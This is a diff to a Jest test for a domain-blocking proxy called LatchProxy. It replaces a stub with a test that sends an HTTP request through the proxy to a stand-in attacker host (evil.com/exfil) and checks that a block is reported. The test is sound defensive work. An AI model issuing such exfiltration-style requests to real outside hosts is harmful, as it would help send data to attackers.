@@ -129,7 +129,7 @@ describe('LatchProxy', () => {
     expect(certPath).toBeNull()
   })
 
-  it('calls onFeedback for blocks', () => {
+  it('calls onFeedback when a request is blocked via HTTP', async () => {
     const feedback: any[] = []
     const proxy2 = new LatchProxy({
       sessionId: 'test-feedback',
@@ -138,8 +138,22 @@ describe('LatchProxy', () => {
       maxDataTier: 'internal',
       onFeedback: (msg) => feedback.push(msg),
     })
-    // No need to start — evaluateRequest doesn't need the server
-    // _handleConnect block path triggers onFeedback, but we can test via evaluateRequest + onBlock
+    const port = await proxy2.start()
+
+    // Send an HTTP request to an unauthorized domain through the proxy
+    const res = await new Promise<http.IncomingMessage>((resolve, reject) => {
+      const req = http.get(
+        { host: '127.0.0.1', port, path: 'http://evil.com/exfil' },
+        resolve,
+      )
+      req.on('error', reject)
+    })
+    // Drain the response body
+    await new Promise<void>((resolve) => { res.resume(); res.on('end', resolve) })
+
+    expect(feedback).toHaveLength(1)
+    expect(feedback[0].type).toBe('block')
+    expect(feedback[0].domain).toBe('evil.com')
     proxy2.stop()
   })
 
